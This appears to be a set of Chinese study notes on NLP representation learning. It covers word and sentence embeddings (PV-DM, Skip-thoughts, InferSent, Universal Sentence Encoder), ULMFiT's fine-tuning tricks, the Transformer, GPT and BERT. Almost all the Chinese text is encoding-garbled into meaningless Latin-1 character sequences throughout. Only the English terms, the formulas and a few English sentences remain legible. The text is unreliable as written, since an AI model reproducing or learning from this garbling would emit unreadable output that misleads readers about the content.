è®¡ç®—å¤æ‚åº¦ â€‹ åŸºäºä¼ ç»Ÿç»Ÿè®¡çš„ N-gram è¿˜æ˜¯æ™®é€šç¥ç»ç½‘ç»œçš„ NNLM ç»“æ„ï¼Œéƒ½ä¼šæœ‰ä¸€ä¸ªå¾ˆä¸¥é‡çš„é—®é¢˜ï¼Œé‚£å°±æ˜¯è®¡ç®—å¤æ‚åº¦éšç€ä¸Šä¸‹æ–‡çª—å£ N å¤§å°çš„å¢å¤§æ€¥å‰§ä¸Šå‡ã€‚ N-gram æ˜¯æŒ‡æ•°ä¸Šå‡ï¼›NNLM æ˜¯ä»¥ |d| Ã— N çš„å½¢å¼å¢åŠ ã€‚ â€‹ CBOW å’Œ Skip-gram ä»¥åŠå†åæ¥çš„ GloVe ç»ˆäºåšåˆ°äº†è®¡ç®—å¤æ‚åº¦ä¸æ‰€é€‰çª—å£å¤§å°æ— å…³ï¼ŒBUTåªæ˜¯é¢„æµ‹å•ä¸ªè¯çš„è®¡ç®—æ—¶é—´å¤æ‚åº¦ï¼Œå¦‚æœæ˜¯æ±‚æ•´ä¸ªè¾“å…¥åºåˆ—çš„è¯ï¼Œè¿˜æ˜¯é¿å…ä¸äº†è¦ä¸åºåˆ—é•¿åº¦ç›¸å…³ã€‚ â€‹ è¿™å‡ ç§æ–¹æ³•ï¼ˆN-gram, ..., GloVeï¼‰ï¼Œå®ƒä»¬éƒ½å—é™äºæ‰€ä½¿ç”¨çš„æ¨¡å‹è¡¨å¾èƒ½åŠ›ï¼ŒæŸç§æ„ä¹‰ä¸Šéƒ½åªèƒ½å¾—åˆ°æ¯”è¾ƒåä¸Šä¸‹æ–‡å…±ç°æ„ä¹‰ä¸Šçš„è¯å‘é‡ï¼Œå¹¶ä¸”ä¹Ÿå¾ˆå°‘è€ƒè™‘è¿‡è¯åºå¯¹äºè¯çš„æ„ä¹‰çš„å½±å“ã€‚ â€‹ â€‹ RNN ç»“æ„çš„è®¡ç®—å¤æ‚åº¦ï¼š çºµå‘ä¸Šä¸»è¦æ˜¯ RNN ç»“æ„æœ¬èº«çš„æ—¶é—´å¤æ‚åº¦ RNN ç»“æ„å†…éƒ¨çš„ hidden state ç»´åº¦ æ¨¡å‹ç»“æ„çš„å¤æ‚åº¦ åœ¨ ELMo ä¸­çš„è¯è¿˜è·Ÿè¯å…¸å¤§å°ç›¸å…³ï¼ˆå› ä¸ºæœ€åä¸€å±‚è¿˜æ˜¯ä¸€ä¸ªè¯å…¸å¤§å°ä¸Šçš„åˆ†ç±»é—®é¢˜ï¼Œä»¥åŠè¾“å…¥ä¹Ÿéœ€è¦ç»´æŠ¤ä¸€ä¸ªè¯å…¸å¤§å°çš„ loop up æ“ä½œï¼‰ ä½†æ˜¯åœ¨æœºå™¨æ€§èƒ½æå‡çš„æƒ…å†µä¸‹ï¼Œè¿™ä¸€éƒ¨åˆ†è‡³å°‘ä¸æ˜¯é˜»ç¢è¯å‘é‡æŠ€æœ¯å‘å±•çš„æœ€å…³é”®çš„å› ç´ äº† æ¨ªå‘ä¸Šçš„è®¡ç®—å¤æ‚åº¦ï¼Œå°±ä¸»è¦æ˜¯å—åˆ¶äºè¾“å…¥åºåˆ—çš„é•¿åº¦ RNN ç»“æ„æœ¬èº«å› ä¸ºåœ¨æ—¶é—´åºåˆ—ä¸Šå…±äº«å‚æ•°ï¼Œå…¶è‡ªèº«è®¡ç®—å¤æ‚åº¦è¿™ä¸€éƒ¨åˆ†ä¸å˜ è¾“å…¥åºåˆ—é•¿åº¦ ä»è¯å‘é‡åˆ°å¥å­å‘é‡ æ— ç›‘ç£å¥å­è¡¨ç¤ºï¼šå°†å¥å­è¡¨ç¤ºæˆå®šé•¿å‘é‡ åŸºçº¿æ¨¡å‹ï¼šword2vec æ¨¡å‹ï¼šAE(Auto Encoder)ï¼ŒLM(language model)ï¼ŒSkip-Thoughtsç­‰ æœ¬èº«çš„ä¿¡æ¯ ä¸Šä¸‹æ–‡çš„ä¿¡æ¯ ä»»åŠ¡çš„ä¿¡æ¯ PV-DM å’Œ PV-DBOW â€‹ PV-DM çš„å…¨ç§°æ˜¯ Distributed Memory Model of Paragraph Vectorsï¼š â€‹ ç±»ä¼¼CBOWï¼Œè¾“å…¥=&gt;&gt;æ–‡æ¡£å‘é‡+ä¸Šä¸‹æ–‡å‘é‡ï¼›è¾“å‡º=&gt;&gt;ä¸‹ä¸€ä¸ªè¯å‘é‡ã€‚æœ‰æ–°æ–‡æ¡£éœ€è¦å†èµ°ä¸€éè®­ç»ƒæµç¨‹ â€‹ PV-DBOW çš„å…¨ç§°åˆ™æ˜¯ Distributed Bag of Words version of Paragraph Vector â€‹ å’Œ Skip-gram ç±»ä¼¼ï¼Œé€šè¿‡æ–‡æ¡£æ¥é¢„æµ‹æ–‡æ¡£å†…çš„è¯ï¼Œè®­ç»ƒçš„æ—¶å€™ï¼Œéšæœºé‡‡æ ·ä¸€äº›æ–‡æœ¬ç‰‡æ®µï¼Œç„¶åå†ä»è¿™ä¸ªç‰‡æ®µä¸­é‡‡æ ·ä¸€ä¸ªè¯ï¼Œè®© PV-DBOW æ¨¡å‹æ¥é¢„æµ‹è¿™ä¸ªè¯ã€‚ From Mikolov et al. experiment, PV-DM is consistently better than PV-DBOW. Concatenation way is often better than sum/ average. image â€‹ é—®é¢˜ï¼šå¾ˆéš¾å»è¡¨å¾è¯è¯­ä¹‹é—´çš„æ›´ä¸°å¯Œçš„è¯­ä¹‰ç»“æ„ Skip-thoughts â€‹ Skip-thoughts ç›´æ¥åœ¨å¥å­é—´è¿›è¡Œé¢„æµ‹ï¼Œä¹Ÿå°±æ˜¯å°† Skip-gram ä¸­ä»¥è¯ä¸ºåŸºæœ¬å•ä½ï¼Œæ›¿æ¢æˆäº†ä»¥å¥å­ä¸ºåŸºæœ¬å•ä½ â€‹ å…·ä½“åšæ³•å°±æ˜¯é€‰å®šä¸€ä¸ªçª—å£ï¼Œéå†å…¶ä¸­çš„å¥å­ï¼Œç„¶ååˆ†åˆ«åˆ©ç”¨å½“å‰å¥å­å»é¢„æµ‹å’Œè¾“å‡ºå®ƒçš„ä¸Šä¸€å¥å’Œä¸‹ä¸€å¥ å¯¹äºå¥å­çš„å»ºæ¨¡åˆ©ç”¨çš„ RNN çš„ sequence ç»“æ„ï¼Œé¢„æµ‹ä¸Šä¸€ä¸ªå’Œä¸‹ä¸€ä¸ªå¥å­æ—¶å€™ï¼Œä¹Ÿæ˜¯åˆ©ç”¨çš„ä¸€ä¸ª sequence çš„ RNN æ¥ç”Ÿæˆå¥å­ä¸­çš„æ¯ä¸€ä¸ªè¯ï¼Œæ‰€ä»¥è¿™ä¸ªç»“æ„æœ¬è´¨ä¸Šå°±æ˜¯ä¸€ä¸ª Encoder-Decoder æ¡†æ¶ï¼Œåªä¸è¿‡å’Œæ™®é€šæ¡†æ¶ä¸ä¸€æ ·çš„æ˜¯ï¼ŒSkip-thoughts æœ‰ä¸¤ä¸ª Decoderã€‚ image Quick-thoughts â€‹ è§£å†³Skip-thoughtsä¸­RNNè®­ç»ƒå¤ªæ…¢çš„é—®é¢˜ â€‹ æŠŠ Skip-thoughts çš„ç”Ÿæˆä»»åŠ¡æ”¹è¿›æˆä¸ºäº†ä¸€ä¸ªåˆ†ç±»ä»»åŠ¡ï¼Œå…·ä½“è¯´æ¥å°±æ˜¯æŠŠåŒä¸€ä¸ªä¸Šä¸‹æ–‡çª—å£ä¸­çš„å¥å­å¯¹æ ‡è®°ä¸ºæ­£ä¾‹ï¼ŒæŠŠä¸æ˜¯å‡ºç°åœ¨åŒä¸€ä¸ªä¸Šä¸‹æ–‡çª—å£ä¸­çš„å¥å­å¯¹æ ‡è®°ä¸ºè´Ÿä¾‹ï¼Œå¹¶å°†è¿™äº›å¥å­å¯¹è¾“å…¥æ¨¡å‹ï¼Œè®©æ¨¡å‹åˆ¤æ–­è¿™äº›å¥å­å¯¹æ˜¯å¦æ˜¯åŒä¸€ä¸ªä¸Šä¸‹æ–‡çª—å£ä¸­ï¼Œå¾ˆæ˜æ˜¾ï¼Œè¿™æ˜¯ä¸€ä¸ªåˆ†ç±»ä»»åŠ¡ã€‚ image InferSent â€‹ æ€æƒ³ç‰¹åˆ«ç®€å•ï¼Œå…ˆè®¾è®¡ä¸€ä¸ªæ¨¡å‹åœ¨æ–¯å¦ç¦çš„ SNLIï¼ˆStanford Natural Language Inferenceï¼‰æ•°æ®é›†ä¸Šè®­ç»ƒï¼Œè€Œåå°†è®­ç»ƒå¥½çš„æ¨¡å‹å½“åšç‰¹å¾æå–å™¨ï¼Œä»¥æ­¤æ¥è·å¾—ä¸€ä¸ªå¥å­çš„å‘é‡è¡¨ç¤ºï¼Œå†å°†è¿™ä¸ªå¥å­çš„è¡¨ç¤ºåº”ç”¨åœ¨æ–°çš„åˆ†ç±»ä»»åŠ¡ä¸Šï¼Œæ¥è¯„ä¼°å¥å­å‘é‡çš„ä¼˜åŠ£ã€‚ â€‹ è¿›è¡Œå¤šä»»åŠ¡å­¦ä¹ ï¼Œä¸åŒä»»åŠ¡ä½¿å¾—æ¨¡å‹å­¦ä¹ åˆ°ä¸åŒç‰¹å¾çš„æå–èƒ½åŠ›ã€‚ General Purpose Sentence Representation â€‹ æœ‰å¾ˆå¤šç›¸ä¼¼çš„ç ”ç©¶ï¼š â€‹ Learning General Purpose Distributed Sentence Representations via Large Scale Multi-task Learningï¼Œå°±æå‡ºäº†åˆ©ç”¨å››ç§ä¸åŒçš„ç›‘ç£ä»»åŠ¡æ¥è”åˆå­¦ä¹ å¥å­çš„è¡¨å¾ï¼Œè¿™å››ç§ä»»åŠ¡åˆ†åˆ«æ˜¯ï¼šNatural Language Inferenceï¼ŒSkip-thougtsï¼ŒNeural Machine Translation ä»¥åŠ Constituency Parsing ç­‰ â€‹ è®­ç»ƒç»“æŸåï¼Œå°†æ¨¡å‹çš„è¾“å‡ºä½œä¸ºå¥å­çš„è¡¨å¾ï¼ˆæˆ–è€…æŠŠè¿™ä¸ªè”åˆå­¦ä¹ çš„æ¨¡å‹ä½œä¸ºç‰¹å¾æå–å™¨ï¼‰ï¼Œç„¶åç›´æ¥åœ¨è¿™ä¸ªè¡¨å¾ä¸Šæ¥ä¸Šéå¸¸ç®€å•çš„å…¨è¿æ¥å±‚åšåˆ†ç±»å™¨ï¼Œå¹¶ä¸”åŒæ—¶ä¿è¯æœ€åº•å±‚çš„ç‰¹å¾æå–å™¨ä¸­å‚æ•°ä¸åŠ¨ï¼ˆä¹Ÿå°±æ˜¯åªæŠŠå®ƒå½“åšç‰¹å¾æå–å™¨ï¼‰ï¼Œå†åœ¨æ–°çš„åˆ†ç±»ä»»åŠ¡ä¸Šåšè®­ç»ƒï¼ˆåªè®­ç»ƒæœ€åæ¥ä¸Šçš„å…¨è¿æ¥å±‚åˆ†ç±»å™¨ï¼‰ï¼Œæœ€åæ ¹æ®è®­ç»ƒå‡ºæ¥çš„ç®€å•åˆ†ç±»å™¨åœ¨å„è‡ªåˆ†ç±»ä»»åŠ¡çš„æµ‹è¯•é›†ä¸Šåšè¯„ä¼°ã€‚ Universal Sentence Encoder â€‹ æ€è·¯ç±»ä¼¼General Purpose Sentence Representationï¼Œåªä¸è¿‡ä½œè€…æå‡ºäº†åˆ©ç”¨ Transformer å’Œ DANï¼ˆä¸Šæ–‡æåˆ°è¿‡çš„å’Œ CBOW ç›¸ä¼¼ï¼Œ *Deep Unordered Composition Rivals Syntactic Methods for Text Classification*ï¼‰ä¸¤ç§æ¡†æ¶ä½œä¸ºå¥å­çš„ Encoderã€‚ Transformer ç»“æ„æ›´ä¸ºå¤æ‚ï¼Œå‚æ•°æ›´å¤šï¼Œè®­ç»ƒä¹Ÿç›¸å¯¹æ¯”è¾ƒè€—æ—¶ï¼Œä½†æ˜¯ä¸€èˆ¬æ¥è¯´æ•ˆæœä¼šæ›´å¥½ä¸€äº›ã€‚ DAN ç»“æ„ç®€å•ï¼Œåªæœ‰ä¸¤ä¸ªéšè—å±‚ï¼ˆç”šè‡³å¯ä»¥å‡å°ä¸ºåªéœ€è¦ä¸€ä¸ªéšè—å±‚ï¼‰ï¼Œå‚æ•°æ¯”è¾ƒå°‘ï¼Œè®­ç»ƒç›¸å¯¹æ¯”è¾ƒçœæ—¶çœèµ„æºï¼Œä½†æ˜¯ä¸€èˆ¬æ¥è¯´æ•ˆæœä¼šå·®ä¸€äº›ï¼ˆå¹¶ä¸æ˜¯ç»å¯¹ï¼Œè®ºæ–‡ä¸­ä¹Ÿå‘ç°æŸäº›åœºæ™¯ä¸‹ DAN çš„æ•ˆæœç”šè‡³æ›´å¥½ï¼‰ã€‚ â€‹ ä½œè€…æ—¢åœ¨æ— æ ‡è®°æ•°æ®ä¸Šè®­ç»ƒï¼Œä¹Ÿåœ¨ç›‘ç£æ•°æ®ä¸Šè®­ç»ƒï¼Œæœ€ååœ¨åä¸ªåˆ†ç±»ä»»åŠ¡ä¸Šè¿›è¡Œè¿ç§»å­¦ä¹ çš„è¯„ä¼°ã€‚ â€‹ ä½œè€…è¿˜æ”¾å‡ºäº†ä»–ä»¬é¢„è®­ç»ƒå¥½çš„ Encoderï¼Œå¯ä»¥ä¾›è¿ç§»å­¦ä¹ çš„å¥å­ç‰¹å¾æå–å™¨ä½¿ç”¨ã€‚ é¢„è®­ç»ƒ Encoderï¼šhttps://tfhub.dev/google/universal-sentence-encoder/2 ULMFit â€‹ Universal Language Model Fine-tuning for Text Classification ä¸­ï¼Œæå‡ºäº†ULMFit ç»“æ„ï¼Œå…¶å®è¿™æœ¬è´¨ä¸Šæ˜¯ä»–ä»¬æå‡ºçš„ä¸€ä¸ªæ–¹æ³•ï¼Œè€Œä¸æ˜¯å…·ä½“çš„æŸç§ç»“æ„æˆ–æ¨¡å‹ã€‚ä¸»è¦åº”ç”¨äºæ–‡æœ¬åˆ†ç±»é—®é¢˜ä¸­ã€‚ â€‹ ULMFiT æœ€ç»ˆåœ¨åˆ†ç±»ä»»åŠ¡ä¸Šè¡¨ç°æƒŠè‰³ï¼Œå°¤å…¶æ˜¯åªéœ€è¦ 100 ä¸ªæ ‡è®°æ•°æ®ï¼Œå°±èƒ½å¤Ÿå­¦ä¹ åˆ°ä¸€ä¸ªè¡¨ç°éå¸¸ comparable çš„åˆ†ç±»å™¨ã€‚ â€‹ å’ŒELMoåŸºæœ¬æ€è·¯ç±»ä¼¼ï¼Œä¹Ÿæ˜¯é¢„è®­ç»ƒå®Œæˆååœ¨å…·ä½“ä»»åŠ¡ä¸Šè¿›è¡Œ finetuneï¼Œä½†ä¸åŒä¹‹å¤„ä¹Ÿæœ‰å¾ˆå¤šã€‚ â€‹ åˆ†ä¸ºä¸‰ä¸ªé˜¶æ®µï¼š å¤§è§„æ¨¡é¢„è®­ç»ƒ ä»»åŠ¡æ•°æ®é¢„è®­ç»ƒ æ¥ä»»åŠ¡æ¨¡å‹éƒ¨åˆ†å†æ¬¡finetune â€‹ Averaged SGD â€‹ Averaged SGD æ˜¯æŒ‡å…ˆå°†æ¨¡å‹è®­ç»ƒåˆ°ä¸€å®š epochï¼Œç„¶åå†å°†å…¶åçš„æ¯ä¸€è½®æƒå€¼è¿›è¡Œå¹³å‡åï¼Œå¾—åˆ°æœ€ç»ˆçš„æƒå€¼ã€‚ \\[ w_{k+1}=w_{k}-\\gamma_{k} \\nabla f\\left(w_{k}\\right) \\] å˜æˆ \\[ w=\\frac{1}{K-T+1} \\sum_{i=T}^{K} w_{i} \\] â€‹ T æ˜¯ä¸€ä¸ªé˜ˆå€¼ï¼Œè€Œ K æ˜¯æ€»å…±çš„è¿­ä»£æ¬¡æ•°ï¼Œè¿™ä¸ªå¼å­çš„æ„æ€å°±æ˜¯æŠŠè¿­ä»£åˆ°ç¬¬ T æ¬¡ä¹‹åï¼Œå¯¹è¯¥å‚æ•°åœ¨å…¶åçš„ç¬¬ T è½®åˆ°æœ€åä¸€è½®ä¹‹é—´çš„æ‰€æœ‰å€¼æ±‚å¹³å‡ï¼Œä»è€Œå¾—åˆ°æœ€åæ¨¡å‹çš„è¯¥å‚æ•°å€¼ã€‚ DropConnect â€‹ LSTM ä¸Šä¸€ä¸ªæ—¶åˆ»å’Œä¸‹ä¸€ä¸ªæ—¶åˆ»ä¹‹é—´çš„éšè—å±‚ä¹‹é—´æ˜¯æœ‰è¿æ¥çš„ï¼Œå¹¶ä¸”è¿™ä¸ªè¿æ¥é€šè¿‡ä¸€ä¸ªå…¨è¿æ¥çš„çŸ©é˜µç›¸è¿ï¼Œè€Œè¿™ä¸ªæ¨¡å‹åˆ™ç”¨äº† DropConnect çš„æ–¹æ³•éšæœº drop æ‰ä¸€äº›è¿æ¥ï¼Œä»è€Œå‡å°‘äº†ä¸€äº›è¿‡æ‹Ÿåˆçš„é£é™©ï¼Œå½“ç„¶åœ¨è¾“å…¥å±‚åˆ°éšè—å±‚ä¹‹é—´ä¹Ÿæœ‰æ­£å¸¸çš„ dropout æ“ä½œã€‚ å¾®è°ƒçš„æŠ€å·§(ä¸¤æ¬¡ finetune) 1. discriminative fine-tune â€‹ ä¸åŒå±‚åœ¨è®­ç»ƒæ›´æ–°å‚æ•°çš„æ—¶å€™ï¼Œèµ‹äºˆä¸åŒçš„å­¦ä¹ ç‡ã€‚ â€‹ ä¸åŒå±‚çš„è¡¨å¾æœ‰ä¸åŒçš„ç‰©ç†å«ä¹‰ï¼Œæ¯”å¦‚æµ…å±‚åå¥æ³•ä¿¡æ¯ï¼Œé«˜å±‚åè¯­ä¹‰ä¿¡æ¯ï¼Œå› æ­¤å¯¹äºä¸åŒå±‚çš„å­¦ä¹ ç‡ä¸åŒã€‚ \\[ \\theta_{t}^{l}=\\theta_{t-1}^{l}+\\eta^{l} \\nabla_{\\theta^{l}} J(\\theta) \\] \\[ \\eta^{l-1}=\\frac{\\eta^{l}}{2.6} \\] 2. slanted triangular learning rates åœ¨ finetune çš„ç¬¬ä¸€é˜¶æ®µï¼Œå¸Œæœ›èƒ½å¤Ÿå…ˆç¨³å®šä½åŸæ¥å·²ç»åœ¨å¤§è§„æ¨¡è¯­æ–™é›†ä¸Šé¢„è®­ç»ƒå¥½çš„å‚æ•°ï¼Œ é€‰æ‹©æ¯”è¾ƒå°çš„ finetune å­¦ä¹ ç‡ åé€æ­¥åŠ å¤§å­¦ä¹ ç‡ï¼Œä½¿å¾—å­¦ä¹ è¿‡ç¨‹èƒ½å¤Ÿå°½é‡å¿«é€Ÿã€‚ å½“è®­ç»ƒæ¥è¿‘å°¾å£°æ—¶ï¼Œé€æ­¥å‡å°å­¦ä¹ ç‡ï¼Œè¿™æ ·è®©æ¨¡å‹é€æ¸å¹³ç¨³æ”¶æ•›ã€‚ è®¡ç®—ï¼š image T -- the number of training iterationsï¼› cut_frac -- the fraction of iterations we increase lrï¼› cut -- the iteration when we switch fromincreasing to decreasing the lr; p -- the fraction ofthe number of iterations we have increased or willdecrease the LR respectively; ratio -- specifies how much smaller the lowest lr is from the maximum lr \\(Î·_{max}\\) ä¸€èˆ¬å–ï¼šcut_frac= 0.1, ratio= 32 and \\(Î·_{max}\\)= 0.01 image gradual unfreezing â€‹ é¢„è®­ç»ƒæ¨¡å‹åœ¨æ–°ä»»åŠ¡ä¸Š finetune æ—¶ï¼Œé€å±‚è§£å†»æ¨¡å‹ï¼Œå…ˆ finetune æœ€åä¸€å±‚ï¼Œç„¶åå†è§£å†»å€’æ•°ç¬¬äºŒå±‚ï¼ŒæŠŠå€’æ•°ç¬¬äºŒå±‚å’Œæœ€åä¸€å±‚ä¸€èµ· finetuneï¼Œç„¶åå†è§£å†»ç¬¬ä¸‰å±‚ã€‚ä»¥æ­¤ç±»æ¨ï¼Œé€å±‚å¾€æµ…å±‚æ¨è¿›ï¼Œæœ€ç»ˆ finetune æ•´ä¸ªæ¨¡å‹æˆ–è€…ç»ˆæ­¢åˆ°æŸä¸ªä¸­é—´å±‚ã€‚è¿™æ ·åšçš„ç›®çš„ä¹Ÿæ˜¯ä¸ºäº† finetune è¿‡ç¨‹èƒ½å¤Ÿæ›´å¹³ç¨³ã€‚ Transformer â€‹ å› ä¸º Self-attention çš„å­˜åœ¨ï¼Œæ‰ä½¿å¾— Transformer åœ¨åšç±»ä¼¼ç¿»è¯‘é—®é¢˜çš„æ—¶å€™ï¼Œå¯ä»¥è®©å…¶ Encoder ä¸ç”¨åšåºåˆ—è¾“å…¥ï¼Œè€Œæ˜¯å°†æ•´ä¸ªåºåˆ—ä¸€æ¬¡å…¨è¾“å…¥ï¼Œå¹¶ä¸”è¶…é•¿åºåˆ—çš„è¾“å…¥ä¹Ÿå˜å¾—å¯èƒ½ã€‚è€Œå…·ä½“åˆ° Self-attention ä¸­ï¼Œå¯ä»¥ç”¨ä¸‹å›¾è¡¨ç¤ºã€‚ä¼˜è´¨Blog image â€‹ Self-attention ä¸­çš„å¤šå¤´æœºåˆ¶ä¾¿æ˜¯å°†è¿™æ ·çš„æ“ä½œåˆ†åˆ«è¿›è¡Œå¤šæ¬¡ï¼Œè®©å¥å­çš„è¡¨å¾å……åˆ†å­¦ä¹ åˆ°ä¸åŒçš„ä¾§é‡ç‚¹ï¼Œæœ€ç»ˆå°†è¿™äº›å¤šå¤´å­¦ä¹ å‡ºæ¥çš„è¡¨å¾ concat åˆ°ä¸€èµ·ï¼Œç„¶åå†åŒä¸€ä¸ªå…¨è¿æ¥ç½‘ç»œï¼Œä¾¿å¯ä»¥å¾—åˆ°è¿™ä¸ªå¥å­æœ€ç»ˆ Self-attention ä¸‹æ–°çš„è¡¨ç¤ºã€‚ â€‹ è®­ç»ƒæ—¶ï¼š Decoder ä¸­çš„è¾“å…¥å¯ä»¥ç”¨çŸ©é˜µå½¢å¼ä¸€æ¬¡å®Œæˆå½“å‰æ•´ä¸ªåºåˆ—çš„ decode è¿‡ç¨‹ï¼Œå› ä¸º ground truth å·²ç»æå‰çŸ¥é“ï¼Œåªéœ€åšå¥½æ¯ä¸ªè¯çš„ mask å°±å¥½ â€‹ inference çš„æ—¶å€™ï¼šDecoder å¿…é¡»æŒ‰ç…§åºåˆ—è¾“å…¥ï¼Œå› ä¸ºåœ¨ç”Ÿæˆæ¯ä¸€ä¸ªè¯çš„æ—¶å€™ï¼Œå¿…é¡»å…ˆç”Ÿæˆå®ƒçš„å‰ä¸€ä¸ªè¯ï¼Œæ— æ³•ä¸€æ¬¡å°†æ•´ä¸ªåºåˆ—å…¨éƒ¨ç”Ÿæˆ Decoder çš„ attention å®é™…åŒ…å«ä¸¤éƒ¨åˆ†ï¼š ç¬¬ä¸€éƒ¨åˆ†æ˜¯å¸¦æœ‰ mask çš„ Self-attentionï¼Œé€šè¿‡ mask å°† decode é˜¶æ®µçš„ attention é™å®šåªä¼š attention åˆ°å·²ç»ç”Ÿæˆè¿‡çš„è¯ä¸Šï¼Œå› æ­¤å«åš Mask Self-attentionã€‚ ç¬¬äºŒéƒ¨åˆ†æ˜¯æ™®é€šçš„ Self-attention æ“ä½œï¼Œä¸è¿‡è¿™æ—¶çš„ K å’Œ V çŸ©é˜µå·²ç»æ›¿æ¢ä¸º Encoder çš„è¾“å‡ºç»“æœï¼Œæ‰€ä»¥æœ¬è´¨ä¸Šå¹¶éä¸€ä¸ª Self-attentionã€‚ image â€‹ ç»“æ„å±•ç¤ºï¼š â€‹ Code GPT â€‹ GPT ä½¿ç”¨çš„ Transformer æ˜¯åªç”¨äº† Decoderï¼Œå› ä¸ºå¯¹äºè¯­è¨€æ¨¡å‹æ¥è®²ï¼Œç¡®å®ä¸éœ€è¦ Encoder çš„å­˜åœ¨ã€‚ image â€‹ è¦åšè¶…é•¿çš„åºåˆ—è¾“å…¥ï¼ˆå¯ä»¥é•¿è¾¾ 11000 ä¸ªè¯ï¼‰ï¼Œä¸ºäº†èƒ½å¤Ÿé«˜æ•ˆèŠ‚çœæ—¶é—´å’Œå†…å­˜çš„å¤„ç†å¦‚æ­¤é•¿çš„åºåˆ—ï¼Œåšäº†ä¸€äº› Memory-Compressed å·¥ä½œï¼Œä¸»è¦æ˜¯ä¸¤æ–¹é¢ï¼š é€šè¿‡ CNN æ“ä½œï¼ŒæŠŠ K å’Œ V å‹ç¼©åˆ°åºåˆ—é•¿åº¦æ›´å°çš„ä¸€ä¸ªçŸ©é˜µï¼ŒåŒæ—¶ä¿æŒ Q ä¸å˜ï¼Œè¿™æ ·ä¹Ÿèƒ½åœ¨ç›¸å½“ç¨‹åº¦ä¸Šå‡å°‘è®¡ç®—é‡ æŠŠä¸€ä¸ª batch å†…éƒ¨çš„åºåˆ—æŒ‰é•¿åº¦è¿›è¡Œåˆ†ç»„ï¼Œç„¶ååˆ†åˆ«åœ¨æ¯ä¸ªç»„å†…éƒ¨è¿›è¡Œ self-attention æ“ä½œï¼Œé¿å…å°†ä¸€äº›å¾ˆçŸ­çš„å¥å­ä¹Ÿ padding åˆ°æ•´ä¸ªè¯­æ–™çš„æœ€å¤§é•¿åº¦ï¼› image â€‹ åˆ©ç”¨è¯­è¨€æ¨¡å‹çš„ç›®æ ‡å‡½æ•°é¢„è®­ç»ƒå®Œæˆåï¼Œä¾¿å¯ä»¥åœ¨å…·ä½“ä»»åŠ¡ä¸Šè¿›è¡Œ finetuneï¼Œå’Œ ULMFiT ä¸­çš„ finetune åˆ†ä¸ºä¸¤ä¸ªé˜¶æ®µçš„æ–¹æ³•ä¸ä¸€æ ·çš„æ˜¯ï¼ŒGPT ç›´æ¥æŠŠè¿™ä¸¤ä¸ªè¿‡ç¨‹ç³…åˆåˆ°ä¸€ä¸ªç›®æ ‡å‡½æ•°ä¸­ï¼š \\[ L_{3}(C)=L_{2}(C)+\\lambda L_{1}(C) \\] â€‹ å…¶ä¸­ L2 æ˜¯ task-specific çš„ç›®æ ‡å‡½æ•°ï¼Œ L1 åˆ™æ˜¯è¯­è¨€æ¨¡å‹çš„ç›®æ ‡å‡½æ•°ã€‚è®ºæ–‡ä¸­è¯´è¿™ç§è”åˆå­¦ä¹ æ–¹å¼èƒ½å¤Ÿè®©è®­ç»ƒæ•ˆæœæ›´å¥½ã€‚ æ”¹é€ ä»»åŠ¡ç±»å‹ï¼š åˆ†ç±»é—®é¢˜ï¼šç›´æ¥åœ¨åŸåºåˆ—çš„å¼€å§‹å’Œæœ«å°¾æ·»åŠ è¡¨ç¤ºå¼€å§‹å’Œæœ«å°¾çš„ç¬¦å·ï¼Œ Text Entailment é—®é¢˜ï¼šå°† Premise å’Œ Hypothesis é€šè¿‡ä¸€ä¸ªä¸­é—´åˆ†éš”ç¬¦â€œ$â€è¿æ¥èµ·æ¥æˆä¸ºä¸€ä¸ªåºåˆ—ï¼Œç„¶ååŒæ ·åœ¨å¼€å¤´å’Œæœ«å°¾æ·»åŠ æ ‡è®°ç¬¦å·ã€‚ æ–‡æœ¬ç›¸ä¼¼é—®é¢˜ï¼šå› ä¸ºåºåˆ— 1 å’Œåºåˆ— 2 æ²¡æœ‰å…ˆåå…³ç³»ï¼Œå› æ­¤å°†å…ˆåå…³ç³»ç›¸åçš„ä¸¤ä¸ªåºåˆ—ä½œä¸ºè¾“å…¥ã€‚ Question Aswering ï¼šå°† query å’Œæ¯ä¸ªå€™é€‰çš„ answer éƒ½åˆ†åˆ«è¿æ¥æˆä¸€ä¸ªåºåˆ—ä½œä¸ºè¾“å…¥ï¼Œæœ€åæŒ‰å„è‡ªçš„æ‰“åˆ†è¿›è¡Œæ’åºã€‚ image â€‹ å¯¹è¾“å…¥æ•°æ®ç»“æ„è¿›è¡Œä¸€å®šå¤„ç†ã€‚ BERT â€‹ Bidirectional Encoder Representation from Transformersï¼Œè¿›ä¸€æ­¥å®Œå–„å’Œæ‰©å±•äº† GPT ä¸­è®¾è®¡çš„é€šç”¨ä»»åŠ¡æ¡†æ¶ï¼Œä½¿å¾— BERT èƒ½å¤Ÿæ”¯æŒåŒ…æ‹¬ï¼šå¥å­å¯¹åˆ†ç±»ä»»åŠ¡ã€å•å¥å­åˆ†ç±»ä»»åŠ¡ã€é˜…è¯»ç†è§£ä»»åŠ¡å’Œåºåˆ—æ ‡æ³¨ä»»åŠ¡ã€‚ æ¨¡å‹ç‰¹ç‚¹ 1. åˆ©ç”¨äº†çœŸåŒå‘çš„ Transformer Encoder ä¸­ç”¨äº† Self-attention æœºåˆ¶ï¼Œè€Œè¿™ä¸ªæœºåˆ¶ä¼šå°†æ¯ä¸€ä¸ªè¯åœ¨æ•´ä¸ªè¾“å…¥åºåˆ—ä¸­è¿›è¡ŒåŠ æƒæ±‚å’Œå¾—åˆ°æ–°çš„è¡¨å¾ æ›´å¤šçš„ transformer çš„ blockï¼ˆæ„å‘³ç€ç»è¿‡æ›´å¤š Self-attentionï¼‰ï¼Œé‚£ä¹ˆäº’ç›¸äº¤èçš„ç¨‹åº¦å°†ä¼šæ›´é«˜ï¼ˆBase æ¨¡å‹æ˜¯ 12å±‚ï¼ŒLarge æ¨¡å‹æ˜¯ 24å±‚ï¼‰ Large ç‰ˆæœ¬ BERT çš„å¤šå¤´æœºåˆ¶ä¸­ Head ä¸ªæ•°å¤šè¾¾ 16 ä¸ªï¼Œå¤šç§å…³ç³»çš„å­¦ä¹  ELMo ä¸ GPT æœ¬è´¨ä¸Šè¿˜æ˜¯ä¸€ä¸ªå•å‘çš„æ¨¡å‹ï¼ŒELMo ç¨å¾®å¥½ä¸€ç‚¹ï¼Œå°†ä¸¤ä¸ªå•å‘æ¨¡å‹çš„ä¿¡æ¯ concatèµ· æ¥ã€‚GPT åˆ™åªç”¨äº†å•å‘æ¨¡å‹ï¼Œ Decdoer çš„å¤©ç”ŸåŸºå› 